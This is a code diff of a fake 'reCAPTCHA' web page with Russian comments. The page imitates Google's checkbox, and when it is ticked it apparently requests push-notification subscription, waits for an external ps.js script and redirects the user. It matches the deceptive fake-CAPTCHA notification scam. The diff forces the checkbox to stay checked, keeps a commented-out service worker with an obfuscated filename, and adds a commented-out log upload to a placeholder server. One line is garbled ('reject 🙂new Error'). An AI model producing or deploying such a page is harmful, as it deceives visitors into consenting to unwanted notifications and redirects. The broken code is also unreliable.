@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
     <title>reCAPTCHA</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -39,10 +40,35 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            border: 2px solid #5f6368; /* Для видимости чекбокса */
+            border: 2px solid #5f6368;
+            appearance: none;
+            background-color: #fff;
+            position: relative;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
         }
         .captcha-checkbox:checked {
-            accent-color: #1a73e8; /* Синий цвет для стандартной галочки */
+            background-color: #1a73e8;
+            border-color: #1a73e8;
+            animation: fillCheckbox 0.3s ease;
+        }
+        .captcha-checkbox:checked::after {
+            content: '✔';
+            color: #fff;
+            font-size: 16px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        @keyframes fillCheckbox {
+            0% {
+                background-color: #fff;
+                border-color: #5f6368;
+            }
+            100% {
+                background-color: #1a73e8;
+                border-color: #1a73e8;
+            }
         }
         .captcha-text {
             font-size: 14px;
@@ -119,7 +145,7 @@
     </div>
 
     <script>
-        // Регистрация Service Worker (закомментировано для тестирования)
+        // Регистрация Service Worker (закомментировано, как в вашем коде)
         /*
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
@@ -146,45 +172,59 @@
                 timestamp: new Date().toISOString()
             };
             console.log('Лог подписки:', data);
+            // Опциональная отправка логов на сервер (закомментировано)
+            /*
+            fetch('https://your-server.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('Лог подписки отправлен:', response))
+            .catch(err => console.error('Ошибка отправки лога:', err));
+            */
         }
 
-        // Функция для выполнения редиректа
+        // Функция для выполнения редиректа (из предоставленного кода)
         function performRedirect() {
             console.log('Попытка редиректа на:', redirectUrl);
-            setTimeout(() => {
-                try {
-                    // Проверка на WebView
-                    const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
-                    if (isWebView) {
-                        console.log('Обнаружен WebView, используем location.assign');
-                        window.location.assign(redirectUrl);
-                    } else {
-                        console.log('Стандартный редирект через location.href');
-                        window.location.href = redirectUrl;
-                    }
-                } catch (e) {
-                    console.error('Ошибка редиректа:', e);
-                    // Резервный вариант: программный клик
-                    try {
-                        console.log('Попытка редиректа через программный клик');
-                        const link = document.createElement('a');
-                        link.href = redirectUrl;
-                        link.style.display = 'none';
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
-                    } catch (clickError) {
-                        console.error('Ошибка программного клика:', clickError);
-                        // Показываем ссылку пользователю
-                        const error = document.getElementById('error');
-                        error.innerHTML = `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`;
-                        error.style.display = 'block';
-                    }
+            try {
+                // Проверка на WebView
+                const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
+                if (isWebView) {
+                    console.log('Обнаружен WebView, используем location.assign');
+                    window.location.assign(redirectUrl);
+                } else {
+                    console.log('Стандартный редирект через location.href');
+                    window.location.href = redirectUrl;
                 }
-            }, 500); // Задержка 500 мс перед редиректом
+                // Резервный редирект через replace
+                setTimeout(() => {
+                    if (window.location.href !== redirectUrl) {
+                        console.log('Резервный редирект через location.replace');
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
+            } catch (e) {
+                console.error('Ошибка редиректа:', e);
+                // Резервный программный клик
+                try {
+                    console.log('Попытка редиректа через программный клик');
+                    const link = document.createElement('a');
+                    link.href = redirectUrl;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                } catch (clickError) {
+                    console.error('Ошибка программного клика:', clickError);
+                    const error = document.getElementById('error');
+                    error.innerHTML = `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`;
+                    error.style.display = 'block';
+                }
+            }
         }
 
-        // Функция для ожидания загрузки ps.js
+        // Функция для ожидания загрузки ps.js (из вашего кода)
         function waitForPsJs(maxAttempts = 10, interval = 500) {
             return new Promise((resolve, reject) => {
                 let attempts = 0;
@@ -194,7 +234,7 @@
                         resolve();
                     } else if (attempts >= maxAttempts) {
                         console.error('ps.js не загружен после максимального количества попыток');
-                        reject(new Error('ps.js not loaded'));
+                        reject 🙂new Error('ps.js not loaded'));
                     } else {
                         attempts++;
                         console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
@@ -205,7 +245,7 @@
             });
         }
 
-        // Функция для запроса подписки
+        // Функция для запроса подписки (из вашего кода)
         function requestSubscription() {
             console.log('Запуск requestSubscription');
             try {
@@ -265,15 +305,30 @@
             if (checkbox.checked) {
                 console.log('Чекбокс отмечен, запускаем подписку');
                 error.style.display = 'none';
-                setTimeout(requestSubscription, 300); // Задержка 300 мс перед подпиской
+                checkbox.disabled = true; // Блокируем чекбокс
+                setTimeout(() => {
+                    requestSubscription();
+                    checkbox.disabled = false; // Разблокируем
+                }, 300); // Задержка 300 мс
             } else {
                 error.style.display = 'block';
             }
         }
 
-        // События
-        document.getElementById('captcha').addEventListener('change', verify);
-        document.getElementById('submit-button').addEventListener('click', verify);
+        // События (комбинированная логика)
+        document.getElementById('captcha').addEventListener('click', () => {
+            console.log('Чекбокс кликнут');
+            const checkbox = document.getElementById('captcha');
+            if (!checkbox.checked) {
+                checkbox.checked = true; // Принудительно устанавливаем галочку
+            }
+            verify();
+        });
+
+        document.getElementById('submit-button').addEventListener('click', () => {
+            console.log('Нажата кнопка Отправить');
+            verify();
+        });
     </script>
 </body>
 </html>
